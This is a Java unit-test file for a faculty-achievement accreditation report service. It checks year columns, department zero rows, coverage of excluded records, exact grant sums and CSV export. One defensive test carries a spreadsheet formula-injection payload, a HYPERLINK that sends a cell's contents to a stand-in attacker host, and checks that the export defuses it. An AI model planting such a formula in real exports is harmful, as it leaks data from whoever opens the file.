package com.niet.facultyachievement.service;

import com.niet.facultyachievement.dto.report.NaacCountRow;
import com.niet.facultyachievement.dto.report.NaacReportResponse;
import com.niet.facultyachievement.dto.report.NaacSection;
import com.niet.facultyachievement.dto.report.NaacSectionResponse;
import com.niet.facultyachievement.entity.Achievement;
import com.niet.facultyachievement.entity.AchievementCategory;
import com.niet.facultyachievement.entity.AchievementStatus;
import com.niet.facultyachievement.entity.AuditAction;
import com.niet.facultyachievement.entity.Award;
import com.niet.facultyachievement.entity.AwardLevel;
import com.niet.facultyachievement.entity.Department;
import com.niet.facultyachievement.entity.GrantStatus;
import com.niet.facultyachievement.entity.Patent;
import com.niet.facultyachievement.entity.PatentStatus;
import com.niet.facultyachievement.entity.ProjectType;
import com.niet.facultyachievement.entity.Publication;
import com.niet.facultyachievement.entity.PublicationIndexing;
import com.niet.facultyachievement.entity.PublicationType;
import com.niet.facultyachievement.entity.ResearchGrant;
import com.niet.facultyachievement.entity.Role;
import com.niet.facultyachievement.entity.User;
import com.niet.facultyachievement.entity.UserStatus;
import com.niet.facultyachievement.exception.BadRequestException;
import com.niet.facultyachievement.exception.ResourceNotFoundException;
import com.niet.facultyachievement.repository.AchievementRepository;
import com.niet.facultyachievement.repository.DepartmentRepository;
import com.niet.facultyachievement.repository.UserRepository;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import java.math.BigDecimal;
import java.nio.charset.StandardCharsets;
import java.time.LocalDate;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Optional;

import static org.junit.jupiter.api.Assertions.assertAll;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.ArgumentMatchers.isNull;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.times;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

/**
 * What the accreditation report counts, and what it admits it left out.
 *
 * <p>Pure Mockito, no Spring context and no MySQL, matching
 * {@code PermissionSecurityTest} and {@code AchievementServiceTest}. All the
 * aggregation happens in Java inside {@link NaacReportServiceImpl}, so feeding it
 * a fixed set of records proves the arithmetic directly.
 *
 * <p>The properties under test are the ones a wrong report would get wrong
 * quietly: a department dropped because it has no research yet, a year column
 * missing because its value did not match the submission form's four options, a
 * grant total drifting because it was summed as a double, and a truncated table
 * that does not say it is truncated.
 */
@ExtendWith(MockitoExtension.class)
@DisplayName("Accreditation report — aggregation, coverage and export")
class NaacReportAggregationTest {

    @Mock private AchievementRepository achievementRepository;
    @Mock private DepartmentRepository departmentRepository;
    @Mock private UserRepository userRepository;
    @Mock private AuditLogService auditLogService;

    @InjectMocks private NaacReportServiceImpl service;

    private static final String ACTOR_EMAIL = "admin@niet.co.in";

    /** The submission form's format. */
    private static final String YEAR_STANDARD = "2024-2025";

    /**
     * An off-format value. {@code AchievementCreateRequest.academicYear} carries no
     * {@code @Pattern}, so an API client can store this — and the report must give
     * it a column rather than let those records vanish from every total.
     */
    private static final String YEAR_ODD = "2024-25";

    private Department cse;
    private Department ece;
    private User author;
    private User admin;

    private AchievementCategory publicationCategory;
    private AchievementCategory grantCategory;
    private AchievementCategory patentCategory;
    private AchievementCategory awardCategory;

    @BeforeEach
    void setUp() {
        cse = Department.builder().id(1L).code("CSE")
                .name("Computer Science & Engineering").build();
        // ECE has no approved research in any fixture below. It must still appear.
        ece = Department.builder().id(2L).code("ECE")
                .name("Electronics & Communication Engineering").build();

        Role facultyRole = Role.builder().id(1L).name("ROLE_FACULTY").build();
        Role adminRole = Role.builder().id(3L).name("ROLE_ADMIN").build();

        author = User.builder().id(10L).employeeId("EMP-F1").fullName("Dr. Author")
                .email("author@niet.co.in").designation("Professor").department(cse)
                .role(facultyRole).status(UserStatus.ACTIVE).build();

        admin = User.builder().id(1L).employeeId("EMP-A1").fullName("Dr. Admin")
                .email(ACTOR_EMAIL).designation("Director").department(cse)
                .role(adminRole).status(UserStatus.ACTIVE).build();

        publicationCategory = AchievementCategory.builder().id(1L).code("PUBLICATION")
                .categoryName("Publication").isActive(true).build();
        grantCategory = AchievementCategory.builder().id(3L).code("RESEARCH_GRANT")
                .categoryName("Research Grant").isActive(true).build();
        patentCategory = AchievementCategory.builder().id(2L).code("PATENT")
                .categoryName("Patent").isActive(true).build();
        awardCategory = AchievementCategory.builder().id(5L).code("AWARD")
                .categoryName("Award").isActive(true).build();
    }

    // ------------------------------------------------------------------
    // Year columns
    // ------------------------------------------------------------------

    @Test
    @DisplayName("Year columns come from the data, so an off-format value gets its own column")
    void yearColumnsAreDerivedFromTheData() {
        List<Achievement> rows = List.of(
                journal(1L, YEAR_STANDARD, PublicationIndexing.SCOPUS),
                journal(2L, YEAR_ODD, PublicationIndexing.UGC_CARE));
        stubReport(rows, rows.size(), List.of());

        NaacReportResponse report = service.generate(null, null, null, ACTOR_EMAIL);

        assertTrue(report.getAcademicYears().contains(YEAR_ODD),
                "An academic year stored as " + YEAR_ODD + " must get a column, not disappear");
        assertTrue(report.getAcademicYears().contains(YEAR_STANDARD));
        assertEquals(2, report.getAcademicYears().size());
    }

    @Test
    @DisplayName("A record's count lands in its own year column, and the row total is the sum")
    void countsLandInTheRightYearColumn() {
        List<Achievement> rows = List.of(
                journal(1L, YEAR_STANDARD, PublicationIndexing.SCOPUS),
                journal(2L, YEAR_STANDARD, PublicationIndexing.SCOPUS),
                journal(3L, YEAR_ODD, PublicationIndexing.OTHER));
        stubReport(rows, rows.size(), List.of());

        NaacReportResponse report = service.generate(null, null, null, ACTOR_EMAIL);
        NaacCountRow cseRow = rowFor(report.getSummary(), "CSE");

        assertAll(
                () -> assertEquals(2L, cseRow.getCountsByYear().get(YEAR_STANDARD)),
                () -> assertEquals(1L, cseRow.getCountsByYear().get(YEAR_ODD)),
                () -> assertEquals(3L, cseRow.getTotal()));
    }

    // ------------------------------------------------------------------
    // Departments with nothing to report
    // ------------------------------------------------------------------

    @Test
    @DisplayName("A department with no approved records appears as a row of explicit zeros")
    void emptyDepartmentAppearsAsZeros() {
        List<Achievement> rows = List.of(journal(1L, YEAR_STANDARD, PublicationIndexing.SCOPUS));
        stubReport(rows, rows.size(), List.of());

        NaacReportResponse report = service.generate(null, null, null, ACTOR_EMAIL);
        NaacCountRow eceRow = rowFor(report.getSummary(), "ECE");

        // In an accreditation table a printed 0 is a fact; a missing row reads as
        // something left out.
        assertAll(
                () -> assertEquals(0L, eceRow.getTotal()),
                () -> assertEquals(0L, eceRow.getCountsByYear().get(YEAR_STANDARD),
                        "The cell must hold an explicit 0, not be absent"),
                () -> assertTrue(eceRow.getCountsByYear().containsKey(YEAR_STANDARD)));
    }

    // ------------------------------------------------------------------
    // Coverage — what the report admits it left out
    // ------------------------------------------------------------------

    @Test
    @DisplayName("Pending and rejected records are excluded from counts but reported in coverage")
    void coverageStatesWhatWasExcluded() {
        List<Achievement> rows = List.of(journal(1L, YEAR_STANDARD, PublicationIndexing.SCOPUS));
        stubReport(rows, rows.size(), List.<Object[]>of(
                excluded(AchievementStatus.PENDING, 3L),
                excluded(AchievementStatus.REJECTED, 2L)));

        NaacReportResponse report = service.generate(null, null, null, ACTOR_EMAIL);

        assertAll(
                () -> assertEquals(1, report.getCoverage().getApprovedIncluded()),
                () -> assertEquals(3L, report.getCoverage().getPendingExcluded()),
                () -> assertEquals(2L, report.getCoverage().getRejectedExcluded()),
                () -> assertFalse(report.getCoverage().isRowCapReached()));
    }

    @Test
    @DisplayName("A category with no report section is counted as excluded, not silently dropped")
    void unknownCategoryIsCountedNotDropped() {
        // The day a sixth category is seeded without a matching NaacSection, those
        // records would otherwise vanish from every total with nothing to say so.
        AchievementCategory unknown = AchievementCategory.builder().id(9L)
                .code("SOMETHING_NEW").categoryName("Something New").isActive(true).build();

        Achievement stray = Achievement.builder().id(99L).user(author).category(unknown)
                .title("A record in a category this report has no section for")
                .status(AchievementStatus.APPROVED).academicYear(YEAR_STANDARD)
                .achievementDate(LocalDate.of(2024, 9, 1)).build();

        List<Achievement> rows = List.of(journal(1L, YEAR_STANDARD, PublicationIndexing.SCOPUS), stray);
        stubReport(rows, rows.size(), List.of());

        NaacReportResponse report = service.generate(null, null, null, ACTOR_EMAIL);

        assertEquals(1L, report.getCoverage().getUnclassifiedExcluded(),
                "An unclassified record must be reported, not absorbed into nothing");
        assertEquals(1, totalAcrossSections(report),
                "It must also not be counted into any section");
    }

    @Test
    @DisplayName("Hitting the row cap sets rowCapReached — the report never truncates in silence")
    void rowCapIsReportedNotHidden() {
        List<Achievement> rows = List.of(journal(1L, YEAR_STANDARD, PublicationIndexing.SCOPUS));
        // The database holds more approved records than were fetched.
        stubReport(rows, rows.size() + 1, List.of());

        NaacReportResponse report = service.generate(null, null, null, ACTOR_EMAIL);

        assertTrue(report.getCoverage().isRowCapReached(),
                "More matching records than fetched rows must raise the incomplete flag");
        assertEquals(NaacReportServiceImpl.ROW_CAP, report.getCoverage().getRowCap());
    }

    // ------------------------------------------------------------------
    // Money
    // ------------------------------------------------------------------

    @Test
    @DisplayName("Grant amounts sum exactly as BigDecimal, with no floating-point drift")
    void grantTotalIsExact() {
        // These three are chosen because summing them as double gives
        // 4000000.0000000005, which would print into a submitted document.
        List<Achievement> rows = List.of(
                grant(1L, YEAR_STANDARD, new BigDecimal("1500000.10")),
                grant(2L, YEAR_STANDARD, new BigDecimal("2499999.70")),
                grant(3L, YEAR_ODD, new BigDecimal("0.20")));
        stubReport(rows, rows.size(), List.of());

        NaacReportResponse report = service.generate(null, null, null, ACTOR_EMAIL);
        NaacSectionResponse grants = sectionFor(report, NaacSection.RESEARCH_GRANTS);

        assertEquals(0, new BigDecimal("4000000.00").compareTo(grants.getTotalAmount()),
                "Expected exactly 4000000.00 but got " + grants.getTotalAmount());
    }

    @Test
    @DisplayName("Only the grants section carries a money total; the others carry none")
    void onlyGrantsCarryAnAmount() {
        List<Achievement> rows = List.of(
                grant(1L, YEAR_STANDARD, new BigDecimal("100000.00")),
                journal(2L, YEAR_STANDARD, PublicationIndexing.SCOPUS));
        stubReport(rows, rows.size(), List.of());

        NaacReportResponse report = service.generate(null, null, null, ACTOR_EMAIL);

        assertNotNull(sectionFor(report, NaacSection.RESEARCH_GRANTS).getTotalAmount());
        assertNull(sectionFor(report, NaacSection.PUBLICATIONS_JOURNAL).getTotalAmount(),
                "A publications total in rupees would be meaningless and must stay absent");
    }

    // ------------------------------------------------------------------
    // Section structure
    // ------------------------------------------------------------------

    @Test
    @DisplayName("Every section's breakdown sums to that section's record total")
    void breakdownsSumToSectionTotals() {
        List<Achievement> rows = oneOfEverything();
        stubReport(rows, rows.size(), List.of());

        NaacReportResponse report = service.generate(null, null, null, ACTOR_EMAIL);

        for (NaacSectionResponse section : report.getSections()) {
            long sum = section.getBreakdown().values().stream().mapToLong(Long::longValue).sum();
            assertEquals(section.getTotal(), sum,
                    "Section " + section.getSectionKey() + " breakdown sums to " + sum
                            + " but reports " + section.getTotal() + " records");
        }
    }

    @Test
    @DisplayName("Every row has exactly as many cells as its section has columns")
    void everyRowLinesUpWithItsHeader() {
        List<Achievement> rows = oneOfEverything();
        stubReport(rows, rows.size(), List.of());

        NaacReportResponse report = service.generate(null, null, null, ACTOR_EMAIL);

        for (NaacSectionResponse section : report.getSections()) {
            for (List<String> row : section.getRows()) {
                // A mismatch would print one field's value under another field's
                // heading in a document that goes to an assessor.
                assertEquals(section.getColumns().size(), row.size(),
                        "Section " + section.getSectionKey() + " has "
                                + section.getColumns().size() + " columns but a row of " + row.size());
            }
        }
    }

    @Test
    @DisplayName("Every section is always present, even the ones with no records")
    void allSectionsAlwaysPresent() {
        List<Achievement> rows = List.of(journal(1L, YEAR_STANDARD, PublicationIndexing.SCOPUS));
        stubReport(rows, rows.size(), List.of());

        NaacReportResponse report = service.generate(null, null, null, ACTOR_EMAIL);

        assertEquals(NaacSection.values().length, report.getSections().size());
        assertEquals(0, sectionFor(report, NaacSection.AWARDS).getTotal(),
                "An empty section prints as zero rather than being omitted");
    }

    @Test
    @DisplayName("Journals and other publications go to different sections")
    void publicationsSplitOnType() {
        List<Achievement> rows = List.of(
                journal(1L, YEAR_STANDARD, PublicationIndexing.SCOPUS),
                conferencePaper(2L, YEAR_STANDARD));
        stubReport(rows, rows.size(), List.of());

        NaacReportResponse report = service.generate(null, null, null, ACTOR_EMAIL);

        assertEquals(1, sectionFor(report, NaacSection.PUBLICATIONS_JOURNAL).getTotal());
        assertEquals(1, sectionFor(report, NaacSection.PUBLICATIONS_OTHER).getTotal());
    }

    @Test
    @DisplayName("A publication with no detail row is never printed as a book or conference paper")
    void publicationWithoutDetailsIsNotAssertedToHaveAType() {
        List<Achievement> rows = List.of(publicationWithNoDetailRow(1L, YEAR_STANDARD));
        stubReport(rows, rows.size(), List.of());

        NaacReportResponse report = service.generate(null, null, null, ACTOR_EMAIL);

        // publications.publication_type is NOT NULL, so a null type means the whole
        // detail row is absent — nobody ever said this was a book.
        assertEquals(0, sectionFor(report, NaacSection.PUBLICATIONS_OTHER).getTotal(),
                "Filing it under \"Books, Chapters & Conference Proceedings\" would put a claim "
                        + "in a submitted document that nobody entered");
        assertEquals(0, sectionFor(report, NaacSection.PUBLICATIONS_JOURNAL).getTotal());
        assertEquals(1, sectionFor(report, NaacSection.PUBLICATIONS_UNCLASSIFIED).getTotal(),
                "It is approved research output, so it must still be listed somewhere");

        // Still counted as included, not quietly dropped from the coverage totals.
        assertEquals(1, report.getCoverage().getApprovedIncluded());
        assertEquals(0, report.getCoverage().getUnclassifiedExcluded(),
                "unclassifiedExcluded is for unknown category codes, not for a known "
                        + "category missing its detail row");
    }

    @Test
    @DisplayName("The CSV never prints a breakdown heading with nothing after \"by\"")
    void csvOmitsTheBreakdownBlockWhenThereIsNothingToSplitOn() {
        List<Achievement> rows = List.of(publicationWithNoDetailRow(1L, YEAR_STANDARD));
        stubReport(rows, rows.size(), List.of());

        String csv = new String(service.exportCsv(null, null, null, ACTOR_EMAIL),
                StandardCharsets.UTF_8);

        assertTrue(csv.lines().noneMatch(line -> line.replace("\"", "").trim().endsWith("— by")),
                "A heading trailing off as \"... — by\" would ship in a submitted document:\n" + csv);
        assertFalse(csv.contains("— by \r"), "Dangling breakdown label in the CSV");
    }

    @Test
    @DisplayName("The type-not-recorded section offers no breakdown to split on")
    void unclassifiedPublicationsCarryNoBreakdown() {
        List<Achievement> rows = List.of(publicationWithNoDetailRow(1L, YEAR_STANDARD));
        stubReport(rows, rows.size(), List.of());

        NaacSectionResponse section = sectionFor(service.generate(null, null, null, ACTOR_EMAIL),
                NaacSection.PUBLICATIONS_UNCLASSIFIED);

        assertTrue(section.getBreakdown().isEmpty(),
                "Every row here has the same missing value, so a one-bucket breakdown "
                        + "would restate the section title and nothing more");
        assertEquals("", section.getBreakdownLabel());
    }

    @Test
    @DisplayName("Metric references ship blank — nothing is invented from memory")
    void metricReferencesShipBlank() {
        List<Achievement> rows = List.of(journal(1L, YEAR_STANDARD, PublicationIndexing.SCOPUS));
        stubReport(rows, rows.size(), List.of());

        NaacReportResponse report = service.generate(null, null, null, ACTOR_EMAIL);

        for (NaacSectionResponse section : report.getSections()) {
            assertTrue(section.getMetricRef() == null || section.getMetricRef().isBlank(),
                    "NAAC publishes three manuals with different numbering, so a metric "
                            + "reference must be filled in by the institution, not shipped as a guess. "
                            + section.getSectionKey() + " carries: " + section.getMetricRef());
        }
        assertNotNull(report.getMetricRefNote(),
                "The report must explain on its face why the references are blank");
    }

    // ------------------------------------------------------------------
    // Bad input
    // ------------------------------------------------------------------

    @Test
    @DisplayName("fromYear later than toYear is refused rather than reported as an empty institution")
    void reversedYearRangeIsRejected() {
        assertThrows(BadRequestException.class,
                () -> service.generate("2025-2026", "2022-2023", null, ACTOR_EMAIL));

        verify(achievementRepository, never()).findApprovedForReport(any(), any(), any(), any());
    }

    @Test
    @DisplayName("An unknown departmentId is a 404, not a report covering nothing")
    void unknownDepartmentIsNotFound() {
        when(userRepository.findByEmail(ACTOR_EMAIL)).thenReturn(Optional.of(admin));
        when(departmentRepository.findById(404L)).thenReturn(Optional.empty());

        assertThrows(ResourceNotFoundException.class,
                () -> service.generate(null, null, 404L, ACTOR_EMAIL));

        verify(achievementRepository, never()).findApprovedForReport(any(), any(), any(), any());
    }

    @Test
    @DisplayName("Filtering to one department reports that department alone, and names it")
    void departmentFilterNarrowsToOneRow() {
        when(userRepository.findByEmail(ACTOR_EMAIL)).thenReturn(Optional.of(admin));
        when(departmentRepository.findById(1L)).thenReturn(Optional.of(cse));
        List<Achievement> rows = List.of(journal(1L, YEAR_STANDARD, PublicationIndexing.SCOPUS));
        when(achievementRepository.findApprovedForReport(eq(1L), isNull(), isNull(), any()))
                .thenReturn(rows);
        when(achievementRepository.countApprovedForReport(eq(1L), isNull(), isNull()))
                .thenReturn((long) rows.size());
        when(achievementRepository.countNonApprovedForReport(eq(1L), isNull(), isNull()))
                .thenReturn(List.of());

        NaacReportResponse report = service.generate(null, null, 1L, ACTOR_EMAIL);

        assertAll(
                () -> assertEquals(1, report.getSummary().size()),
                () -> assertEquals("CSE", report.getSummary().get(0).getDepartmentCode()),
                () -> assertEquals(cse.getName(), report.getDepartmentFilterName()));
        // The department list is not read when one department was named.
        verify(departmentRepository, never()).findAll();
    }

    // ------------------------------------------------------------------
    // CSV export
    // ------------------------------------------------------------------

    @Test
    @DisplayName("The CSV starts with the UTF-8 BOM so Excel reads Indian names correctly")
    void csvCarriesTheUtf8Bom() {
        List<Achievement> rows = List.of(journal(1L, YEAR_STANDARD, PublicationIndexing.SCOPUS));
        stubReport(rows, rows.size(), List.of());

        byte[] csv = service.exportCsv(null, null, null, ACTOR_EMAIL);

        assertTrue(csv.length > 3);
        assertAll(
                () -> assertEquals((byte) 0xEF, csv[0]),
                () -> assertEquals((byte) 0xBB, csv[1]),
                () -> assertEquals((byte) 0xBF, csv[2]));
    }

    @Test
    @DisplayName("Downloading is written to the audit trail; the entry names the filters, not the records")
    void exportIsAudited() {
        List<Achievement> rows = List.of(journal(1L, YEAR_STANDARD, PublicationIndexing.SCOPUS));
        stubReport(rows, rows.size(), List.of());

        service.exportCsv(null, null, null, ACTOR_EMAIL);

        verify(auditLogService, times(1)).logAction(
                eq(AuditAction.REPORT_EXPORTED), eq("REPORT"), isNull(),
                any(String.class), eq(ACTOR_EMAIL), isNull());
    }

    @Test
    @DisplayName("Reading the report on screen is not audited — only taking a copy away is")
    void readingIsNotAudited() {
        List<Achievement> rows = List.of(journal(1L, YEAR_STANDARD, PublicationIndexing.SCOPUS));
        stubReport(rows, rows.size(), List.of());

        service.generate(null, null, null, ACTOR_EMAIL);

        verify(auditLogService, never()).logAction(any(), any(), any(), any(), any(String.class), any());
    }

    @Test
    @DisplayName("A faculty-typed title that looks like a spreadsheet formula is defused in the CSV")
    void csvDefusesFormulaInjection() {
        // The title field is free text a faculty member types, and this file is
        // opened in the administrator's Excel. Quoting alone does not stop it:
        // quoting fixes parsing, not what the spreadsheet does with the value.
        String hostile = "=HYPERLINK(\"http://attacker.example/?\"&A1,\"Click me\")";
        Achievement a = journal(1L, YEAR_STANDARD, PublicationIndexing.SCOPUS);
        a.setTitle(hostile);
        List<Achievement> rows = List.of(a);
        stubReport(rows, rows.size(), List.of());

        String csv = new String(service.exportCsv(null, null, null, ACTOR_EMAIL),
                StandardCharsets.UTF_8);

        assertTrue(csv.contains("\"'=HYPERLINK"),
                "The leading = must be neutralised with an apostrophe so Excel treats it as text");
        assertFalse(csv.contains("\"=HYPERLINK"),
                "A cell still starting with = would execute when the file is opened");
    }

    @Test
    @DisplayName("The CSV states its coverage near the top, not in a footnote")
    void csvStatesItsCoverage() {
        List<Achievement> rows = List.of(journal(1L, YEAR_STANDARD, PublicationIndexing.SCOPUS));
        stubReport(rows, rows.size(), List.<Object[]>of(excluded(AchievementStatus.PENDING, 7L)));

        String csv = new String(service.exportCsv(null, null, null, ACTOR_EMAIL),
                StandardCharsets.UTF_8);

        // A reader who stops after the first screen must already know what the
        // numbers below do not include.
        assertAll(
                () -> assertTrue(csvLineContaining(csv, "Approved records included").endsWith(",1"),
                        "The CSV must say how many records it counted"),
                () -> assertTrue(csvLineContaining(csv, "Pending").endsWith(",7"),
                        "The CSV must say how many it excluded, with the number"),
                () -> assertTrue(csv.contains("Generated by"),
                        "A submitted document must record who produced it"));
    }

    // ------------------------------------------------------------------
    // Fixtures and helpers
    // ------------------------------------------------------------------

    /**
     * Stubs the whole read path for the unfiltered case.
     *
     * @param rows          what the fetch returns
     * @param approvedTotal what the database says matches, which may exceed
     *                      {@code rows.size()} when the row cap has bitten
     * @param nonApproved   grouped {@code {status, count}} pairs for coverage
     */
    private void stubReport(List<Achievement> rows, long approvedTotal, List<Object[]> nonApproved) {
        when(userRepository.findByEmail(ACTOR_EMAIL)).thenReturn(Optional.of(admin));
        when(departmentRepository.findAll()).thenReturn(List.of(ece, cse));
        when(achievementRepository.findApprovedForReport(isNull(), isNull(), isNull(), any()))
                .thenReturn(rows);
        when(achievementRepository.countApprovedForReport(isNull(), isNull(), isNull()))
                .thenReturn(approvedTotal);
        when(achievementRepository.countNonApprovedForReport(isNull(), isNull(), isNull()))
                .thenReturn(nonApproved);
    }

    /**
     * One grouped {@code {status, count}} row, in the shape
     * {@code countNonApprovedForReport} returns.
     */
    private Object[] excluded(AchievementStatus status, long count) {
        return new Object[]{status, count};
    }

    /** One approved record in each of the six sections. */
    private List<Achievement> oneOfEverything() {
        List<Achievement> rows = new ArrayList<>();
        rows.add(journal(1L, YEAR_STANDARD, PublicationIndexing.SCOPUS));
        rows.add(conferencePaper(2L, YEAR_STANDARD));
        rows.add(grant(3L, YEAR_STANDARD, new BigDecimal("250000.00")));
        rows.add(patent(4L, YEAR_ODD));
        rows.add(award(5L, YEAR_STANDARD));
        rows.add(workshopWithNoDetailRow(6L, YEAR_STANDARD));
        return rows;
    }

    private Achievement base(Long id, AchievementCategory category, String title, String year) {
        return Achievement.builder().id(id).user(author).category(category).title(title)
                .status(AchievementStatus.APPROVED).academicYear(year)
                .achievementDate(LocalDate.of(2024, 9, 15)).build();
    }

    private Achievement journal(Long id, String year, PublicationIndexing indexing) {
        Achievement a = base(id, publicationCategory, "A journal paper " + id, year);
        a.setPublication(Publication.builder().id(id)
                .publicationType(PublicationType.JOURNAL)
                .journalConferenceName("Journal of Testing")
                .publisher("Elsevier").doi("10.1000/test." + id)
                .isbnIssn("1234-5678").volume("12").issue("3").pages("100-110")
                .impactFactor(new BigDecimal("2.45")).indexing(indexing).build());
        return a;
    }

    private Achievement conferencePaper(Long id, String year) {
        Achievement a = base(id, publicationCategory, "A conference paper " + id, year);
        a.setPublication(Publication.builder().id(id)
                .publicationType(PublicationType.CONFERENCE)
                .journalConferenceName("International Conference on Testing")
                .publisher("IEEE").pages("1-6")
                .indexing(PublicationIndexing.OTHER).build());
        return a;
    }

    /**
     * An approved publication whose {@code publications} row was never created.
     * Since {@code publication_type} is {@code NOT NULL}, this is the only way a
     * null type can occur, and it means no publication metadata exists at all.
     */
    private Achievement publicationWithNoDetailRow(Long id, String year) {
        return base(id, publicationCategory, "A publication of unknown kind " + id, year);
    }

    private Achievement grant(Long id, String year, BigDecimal amount) {
        Achievement a = base(id, grantCategory, "A funded project " + id, year);
        a.setResearchGrant(ResearchGrant.builder().id(id)
                .fundingAgency("AICTE").projectTitle("Funded project " + id)
                .grantAmount(amount).projectType(ProjectType.RESEARCH)
                .durationMonths(24).grantStatus(GrantStatus.ONGOING).build());
        return a;
    }

    private Achievement patent(Long id, String year) {
        Achievement a = base(id, patentCategory, "A patent " + id, year);
        a.setPatent(Patent.builder().id(id).patentNumber("IN-" + id)
                .patentStatus(PatentStatus.GRANTED).country("India")
                .filingDate(LocalDate.of(2023, 4, 1))
                .grantDate(LocalDate.of(2024, 11, 20)).build());
        return a;
    }

    private Achievement award(Long id, String year) {
        Achievement a = base(id, awardCategory, "An award " + id, year);
        a.setAward(Award.builder().id(id).awardName("Best Paper Award")
                .awardingBody("IEEE").awardLevel(AwardLevel.INTERNATIONAL).build());
        return a;
    }

    /**
     * A record whose category has a section but whose detail row is missing — the
     * report must print it with empty extra columns rather than fail or skip it.
     */
    private Achievement workshopWithNoDetailRow(Long id, String year) {
        AchievementCategory workshopCategory = AchievementCategory.builder().id(4L)
                .code("WORKSHOP_FDP").categoryName("Workshop / FDP").isActive(true).build();
        return base(id, workshopCategory, "An FDP with no detail row " + id, year);
    }

    /** The one CSV line carrying a label, so a count can be checked against it. */
    private String csvLineContaining(String csv, String label) {
        return csv.lines()
                .filter(line -> line.contains(label))
                .findFirst()
                .orElseThrow(() -> new AssertionError("No CSV line mentions \"" + label + "\""));
    }

    private NaacCountRow rowFor(List<NaacCountRow> rows, String departmentCode) {        return rows.stream()
                .filter(r -> departmentCode.equals(r.getDepartmentCode()))
                .findFirst()
                .orElseThrow(() -> new AssertionError(
                        "No row for department " + departmentCode + " in " + rows));
    }

    private NaacSectionResponse sectionFor(NaacReportResponse report, NaacSection section) {
        return report.getSections().stream()
                .filter(s -> section.name().equals(s.getSectionKey()))
                .findFirst()
                .orElseThrow(() -> new AssertionError("Section missing: " + section));
    }

    private long totalAcrossSections(NaacReportResponse report) {
        return report.getSections().stream().mapToLong(NaacSectionResponse::getTotal).sum();
    }
}
